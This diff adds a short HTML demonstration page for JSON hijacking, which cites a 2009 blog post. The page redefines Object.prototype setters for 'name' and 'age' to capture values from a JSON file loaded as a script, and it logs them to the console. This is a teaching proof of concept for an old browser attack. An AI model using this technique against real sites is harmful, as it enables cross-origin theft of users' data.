@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>JSON Hijacking</title>
+</head>
+<body>
+<h1>JSON Hijacking with __defineSetter__</h1>
+<p>As described in the Blog <a href="http://haacked.com/archive/2009/06/25/json-hijacking.aspx/">You've Been Haacked</a></p>
+
+<script>
+  Object.prototype.__defineSetter__('name', function(obj){console.log('Name: ', obj);});
+  Object.prototype.__defineSetter__('age', function(obj){console.log('Age: ', obj);});
+</script>
+
+<script type="text/javascript" src="./data.json"></script>
+
+</body>
+</html>
